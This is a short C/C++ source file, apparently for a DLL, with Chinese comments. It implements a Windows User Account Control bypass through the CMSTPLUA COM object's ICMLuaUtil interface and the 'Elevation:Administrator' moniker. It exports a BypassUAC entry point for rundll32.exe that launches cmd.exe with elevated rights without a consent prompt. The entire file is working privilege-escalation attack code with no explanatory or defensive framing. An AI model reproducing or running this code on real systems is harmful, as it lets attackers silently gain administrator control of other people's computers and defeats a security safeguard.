#include "pch.h"
#include "export.h"



HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid)
{
	BIND_OPTS3 bo;
	WCHAR wszCLSID[MAX_PATH] = { 0 };
	WCHAR wszMonikerName[MAX_PATH] = { 0 };
	HRESULT hr = 0;

	// 初始化COM环境
	::CoInitialize(NULL);

	// 构造字符串
	::StringFromGUID2(rclsid, wszCLSID, (sizeof(wszCLSID) / sizeof(wszCLSID[0])));
	hr = ::StringCchPrintfW(wszMonikerName, (sizeof(wszMonikerName) / sizeof(wszMonikerName[0])), L"Elevation:Administrator!new:%s", wszCLSID);
	if (FAILED(hr))
	{
		return hr;
	}

	// 设置BIND_OPTS3
	::RtlZeroMemory(&bo, sizeof(bo));
	bo.cbStruct = sizeof(bo);
	bo.hwnd = hWnd;
	bo.dwClassContext = CLSCTX_LOCAL_SERVER;

	// 创建名称对象并获取COM对象
	hr = ::CoGetObject(wszMonikerName, &bo, riid, ppVoid);
	return hr;
}


BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable)
{
	HRESULT hr = 0;
	CLSID clsidICMLuaUtil = { 0 };
	IID iidICMLuaUtil = { 0 };
	ICMLuaUtil* CMLuaUtil = NULL;
	BOOL bRet = FALSE;

	do {
		::CLSIDFromString(CLSID_CMSTPLUA, &clsidICMLuaUtil);
		::IIDFromString(IID_ICMLuaUtil, &iidICMLuaUtil);

		// 提权
		hr = CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&CMLuaUtil));
		if (FAILED(hr))
		{
			break;
		}

		// 启动程序
		hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW);
		if (FAILED(hr))
		{
			break;
		}

		bRet = TRUE;
	} while (FALSE);

	// 释放
	if (CMLuaUtil)
	{
		CMLuaUtil->lpVtbl->Release(CMLuaUtil);
	}

	return bRet;
}

// 导出函数给rundll32.exe调用执行
void CALLBACK BypassUAC(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow)
{
	// 获取 ANSI 字符串的长度
	int len = MultiByteToWideChar(CP_ACP, 0, "C:\\Windows\\System32\\cmd.exe", -1, NULL, 0);
	// 分配内存以存储宽字符字符串
	LPWSTR wideCmdLine = new WCHAR[len + 1];
	wideCmdLine[0] = '\0';
	// 将 ANSI 字符串转换为宽字符字符串
	MultiByteToWideChar(CP_ACP, 0, "C:\\Windows\\System32\\cmd.exe", -1, wideCmdLine, len);



	CMLuaUtilBypassUAC(wideCmdLine);
}